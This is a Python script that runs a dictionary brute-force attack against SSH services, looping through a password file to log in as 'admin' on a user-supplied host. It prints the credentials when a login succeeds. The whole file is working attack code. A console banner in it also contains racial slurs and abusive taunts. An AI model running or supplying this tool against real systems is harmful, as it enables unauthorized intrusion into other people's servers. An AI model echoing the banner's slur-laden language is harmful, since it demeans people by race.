import paramiko
import sys
import time

def sshConnection(target, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target, port=22, username="admin", password=password, timeout=1)
        print(f"\nAuthentication successful. Credentials: admin@{target} Password: {password}")
        sys.exit(0)
    except:
        pass
    finally:
        ssh.close()

def main(target, password_file):
    try:
        with open(password_file, "r") as f:
            passwords = f.readlines()
    except FileNotFoundError:
        print(f"File {password_file} not found.")
        sys.exit(1)

    print("\n\tBrute forcing r00ters by yall skid niggas can't even booterscan right love poole and some nigga on meth from the file...\n")
    for password in passwords:
        start_time = time.time()
        password = password.strip()
        sshConnection(target, password)
        while time.time() - start_time < 0.001:  # Attempt to enforce a 1ms delay
            pass  # Busy-wait to more closely align with the desired timing

if __name__ == "__main__":
    print("\n\tDictionary brute force attack on SSH services")
    print("\t---------------------------------------------\n\n")

    target = input(" > Enter target host address to connect to: ")
    password_file = input(" > Enter the filename of the password list: ")

    main(target, password_file)
